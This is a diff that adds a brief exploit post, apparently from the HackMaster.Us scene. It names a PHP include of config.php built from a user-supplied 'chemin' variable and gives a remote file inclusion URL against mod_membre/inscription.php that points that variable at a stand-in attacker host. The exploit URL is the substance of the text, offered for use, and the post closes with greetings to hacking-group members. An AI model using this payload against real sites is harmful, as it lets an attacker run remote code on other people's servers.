@@ -1,0 +1,8 @@
+#CODE:    include ("$chemin/include/config.php")
+
+#Exploit:
+http://www.example.com/[path]/mod_membre/inscription.php?chemin=http://evil_scripts?
+
+#Thanx : Www.HackMaster.Us
+
+#Greetz: RooTTeR, XYU, Cyborg, BuZuL and all Hackmaster.Us Users
